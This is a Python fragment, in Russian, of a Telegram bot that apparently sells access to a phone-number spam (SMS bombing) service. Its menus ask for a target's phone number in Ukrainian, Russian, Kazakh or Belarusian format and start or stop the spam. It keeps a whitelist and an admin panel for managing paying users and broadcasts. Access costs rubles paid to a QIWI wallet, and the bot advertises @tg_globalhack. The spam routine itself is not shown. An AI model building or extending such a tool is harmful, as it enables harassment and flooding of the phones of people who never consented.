    adminka = types.InlineKeyboardButton(text="Админка", callback_data="adminka1")

    if str(message.chat.id) in open('adm.txt').read():
        keyboard.add(button1)
        keyboard.add(button3)
        keyboard.add(adminka)
        bot.send_message(message.chat.id, f'@tg_globalhack', reply_markup = keyboard, parse_mode='HTML')
    
    elif str(message.chat.id) in open('vip_id.txt').read():
        keyboard.add(button1)
        keyboard.add(button3)
        bot.send_message(message.chat.id, f'@tg_globalhack', reply_markup = keyboard, parse_mode='HTML')
    
    else:
        keyboard = types.InlineKeyboardMarkup()
        button5 = types.InlineKeyboardButton(text="Получить доступ", callback_data="button5")
        keyboard.add(button5)
        bot.send_message(message.chat.id, '@tg_globalhack',  reply_markup=keyboard, parse_mode='HTML')
##########################################################################################
    if call.message:
        if call.data == "button1":
            bot.send_message(message.chat.id, '<b>Введите номер без + в формате</b>:\n🇺🇦 380xxxxxxxxx\n🇷🇺 79xxxxxxxxx\n🇰🇿 77xxxxxxxxx\n🇧🇾 375xxxxxxxxx', parse_mode='HTML')
        elif call.data == "button3":
            if message.chat.id not in running_spams_per_chat_id:
                bot.send_message(message.chat.id, 'Вы еще не начинали спам.')
                start(message)
            else:
                running_spams_per_chat_id.remove(message.chat.id)
                bot.send_message(message.chat.id, 'Cпам успешно остановлен.')
                start(message)
##########################################################################################
        elif call.data == "button2":
            settings = types.InlineKeyboardMarkup()
            button7 = types.InlineKeyboardButton(text="Добавить номер в белый лист", callback_data="button7")
            button8 = types.InlineKeyboardButton(text="Информация", callback_data="button8")
            button9 = types.InlineKeyboardButton(text="Обновить", callback_data="button9")
            button10 = types.InlineKeyboardButton(text="Назад", callback_data="button10")

            settings.add(button7)
            settings.add(button8)
            settings.add(button9)
            settings.add(button10)
            bot.send_message(message.chat.id, f"Настройки бота. Выберите действие:", reply_markup=settings)

        elif call.data == 'button8':
            bot.send_message(message.chat.id, banner, parse_mode='HTML')

        elif call.data == 'button9':
            start(message)

        elif call.data == 'button7':
            lol = bot.send_message(message.chat.id, "Введите номер, который хотите доабвить в белый лист.")
            bot.register_next_step_handler(lol, addwl)

        elif call.data == 'button10':
            bot.send_message(message.chat.id, 'Вы вернулись в главное меню.')
            start(message)
##########################################################################################
        elif call.data == 'adminka1':
            admm = types.InlineKeyboardMarkup()
            addpol = types.InlineKeyboardButton(text="Добавить пользователя", callback_data="button20")
            delpol = types.InlineKeyboardButton(text="Удалить пользователя", callback_data="button21")
            addwll = types.InlineKeyboardButton(text="Добавить номер в Белый лист", callback_data="button22")
            delwll = types.InlineKeyboardButton(text="Удалить номер с Белого листа", callback_data="button23")
            rassl = types.InlineKeyboardButton(text="Рассылка", callback_data="button24")
            oblov = types.InlineKeyboardButton(text="Обновить бота", callback_data="button25")
            backb = types.InlineKeyboardButton(text="Вернуться назад", callback_data="button26")


            admm.add(addpol, delpol)
            admm.add(addwll, delwll)
            admm.add(rassl, oblov)
            admm.add(backb)
            bot.send_message(message.chat.id, f"Админка бота. Выберите действие:", reply_markup=admm)

        elif call.data == 'button20':
            a = bot.send_message(message.chat.id, 'Введите id пользователя, которого хотите добавить в базу.')
            bot.register_next_step_handler(a, adduser)

        elif call.data == 'button21':
            b = bot.send_message(message.chat.id, 'Введите id пользователя, которого хотите удалить с базы.')
            bot.register_next_step_handler(b, delluser)

        elif call.data == 'button22':
            ww = bot.send_message(message.chat.id, "Введите номер, который вы хотите добавить в Белый лист.")
            bot.register_next_step_handler(ww, addwl)

        elif call.data == 'button23':
            ww = bot.send_message(message.chat.id, "Введите номер, который вы хотите удалить с Белого листа.")
            bot.register_next_step_handler(ww, delllwl)

        elif call.data == 'button24':
            bot.send_message(message.chat.id, 'Введите сообщение в формате: "РАЗОСЛАТЬ: ваш_текст" без кавычек')

        elif call.data == 'button25':
            bot.send_message(message.chat.id, 'Бот перезапускается...')
            os.system('python start.py')

        elif call.data == 'button26':
            bot.send_message(message.chat.id, 'Выберите действие', reply_markup = keyboard)


##########################################################################################

        elif call.data == "button5":
            bot.send_message(message.chat.id, '❗️ Для приобретения доступа к боту переведите '+str(price) +' рублей на QIWI кошелёк любым способом.\n\n📱Номер телефона: ' + '<pre>' +qiwi_phone+'</pre> \n👑Комментарий: ' '<pre>'+str(message.chat.id)+'</pre> \n\nЕсли Вы перевели деньги с другим комментариями, то доступ вы не получите!\nПосле пополнения баланса введите /start\n\n<b>При ошибочном переводе писать @pentestxr</b>', parse_mode = 'HTML')

bot.polling(none_stop=True)